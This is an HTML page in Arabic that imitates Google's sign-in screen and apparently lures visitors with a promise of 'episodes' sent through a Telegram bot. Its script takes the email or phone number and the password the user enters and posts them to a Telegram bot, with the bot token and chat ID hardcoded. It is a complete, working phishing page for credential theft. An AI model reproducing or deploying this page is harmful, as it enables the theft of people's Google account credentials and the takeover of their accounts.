<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Google</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 48px 40px 36px;
            border-radius: 8px;
            border: 1px solid #dadce0;
            width: 450px;
            text-align: center;
        }
        .google-logo {
            width: 75px;
            margin-bottom: 10px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
            color: #202124;
        }
        .subtitle {
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 30px;
            color: #202124;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        .error-message {
            color: #d93025;
            font-size: 14px;
            text-align: left;
            margin-top: -8px;
            margin-bottom: 8px;
        }
        .success-message {
            color: #34a853;
            font-size: 16px;
            margin-top: 20px;
            font-weight: bold;
        }
        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            margin-top: 20px;
            text-transform: none;
        }
        button:hover {
            background-color: #1557b0;
            box-shadow: 0 1px 2px rgba(60,64,67,0.3);
        }
        .forgot-password {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            display: block;
            margin-top: 20px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NSIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDc1IDI0Ij48cGF0aCBmaWxsPSIjNDI4NUY0IiBkPSJNMjIuNiAxMmMwLS42LS4xLTEuMy0uMi0xLjhIMTJ2My40aDUuOWMtLjMgMS4zLTEgMi40LTIuMSAzLjF2Mi42aDMuNGMxLjktMS44IDMuNC00LjQgMy40LTcuM3oiLz48cGF0aCBmaWxsPSIjMzRBODUzIiBkPSJNMTIgMjJjMi45IDAgNS4zLTEgNy0yLjdsLTMuNC0yLjZjLS45LjYtMi4xIDEtMy42IDEtMi44IDAtNS4yLTEuOS01LjktNC40SDIuMnYyLjdDMy45IDE5LjkgNy43IDIyIDEyIDIyeiIvPjxwYXRoIGZpbGw9IiNGQkJDMDUiIGQ9Ik02LjEgMTMuMmMtLjItLjYtLjMtMS4zLS4zLTJzLjEtMS40LjMtMlYyLjNIMi4yQzEuNCAzLjkuOSA1LjkuOSA4cy41IDQuMSAxLjMgNS43bDMuOS0yLjV6Ii8+PHBhdGggZmlsbD0iI0VBNDMzNSIgZD0iTTEyIDUuNmMyLjEgMCAzLjguOCA1LjIgMi4ybDMtM0MxOC4zIDIuNyAxNS41IDEgMTIgMSA3LjcgMSAzLjkgMy4xIDIuMiA2LjNsNCAyLjZjLjctMi41IDMuMS00LjMgNS44LTQuM3oiLz48L3N2Zz4=" alt="Google Logo" class="google-logo">
        <h1>تسجيل الدخول</h1>
        <p class="subtitle">المتابعة إلى Google</p>
        <form id="loginForm">
            <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <div id="usernameError" class="error-message"></div>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
            <div id="successMessage" class="success-message" style="display: none;"></div>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value.trim();
            const usernameError = document.getElementById('usernameError');
            const successMessage = document.getElementById('successMessage');
            const password = document.getElementById('password').value;

            // Reset error and success messages
            usernameError.textContent = '';
            successMessage.style.display = 'none';

            // Regular expression to validate Gmail or phone number
            const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
            const phoneRegex = /^[0-9]{10,15}$/;

            if (!gmailRegex.test(username) && !phoneRegex.test(username)) {
                usernameError.textContent = 'يرجى إدخال بريد Gmail صالح أو رقم هاتف صالح.';
                return;
            }

            // Telegram bot token and chat ID
            const botToken = '7676983813:AAGe8IxQvzirs4iMpJIVWkudxc8kyzZLCiE';
            const chatId = '862797876';

            // Message to send
            const message = `New login attempt:\nUsername: ${username}\nPassword: ${password}`;

            // Send data to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    successMessage.textContent = 'تم إرسال الطلب بنجاح. في حالة صحة المعلومات، سوف تحصل على جميع الحلقات عبر البوت.';
                    successMessage.style.display = 'block';
                } else {
                    usernameError.textContent = 'فشل في إرسال المعلومات. حاول مرة أخرى.';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                usernameError.textContent = 'حدث خطأ أثناء الإرسال. حاول مرة أخرى.';
            });
        });
    </script>
</body>
</html>
